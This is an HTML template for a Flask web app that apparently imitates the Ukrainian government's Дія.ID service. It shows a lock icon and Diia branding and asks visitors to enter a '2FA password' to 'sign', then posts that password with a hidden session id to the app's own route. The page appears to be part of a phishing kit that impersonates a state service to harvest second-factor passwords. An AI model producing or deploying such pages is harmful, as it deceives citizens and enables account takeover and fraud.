<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Дія.ID | Захист</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>body { font-family: 'Inter', sans-serif; background-color: #f7f9fb; }</style>
</head>
<body class="flex flex-col min-h-screen">
    <main class="flex-1 flex flex-col px-6 pt-20 max-w-[480px] mx-auto w-full">
        <div class="text-center mb-10">
            <div class="w-20 h-20 bg-black rounded-full flex items-center justify-center mx-auto mb-6 shadow-xl">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
            </div>
            <h1 class="text-3xl font-bold mb-2">Дія.ID</h1>
            <p class="text-gray-500">Введіть пароль підпису для підтвердження</p>
        </div>

        {% if error %}
        <div class="mb-6 bg-red-50 text-red-600 p-4 rounded-2xl text-center text-sm font-medium border border-red-100 italic">{{ error }}</div>
        {% endif %}

        <div class="bg-white rounded-[32px] p-6 border border-gray-100 shadow-sm">
            <form method="POST" action="{{ url_for('main.verify_password') }}">
                <input type="hidden" name="sid" value="{{ sid }}">
                <input type="password" name="password" placeholder="Пароль 2FA" required
                       class="w-full bg-gray-50 rounded-2xl p-5 text-lg outline-none border border-transparent focus:border-black mb-6 transition-all">
                <button type="submit" class="bg-black text-white w-full py-5 rounded-2xl font-bold text-[15px] active:scale-95 transition-transform">ПІДПИСАТИ</button>
            </form>
        </div>
    </main>
</body>
</html>
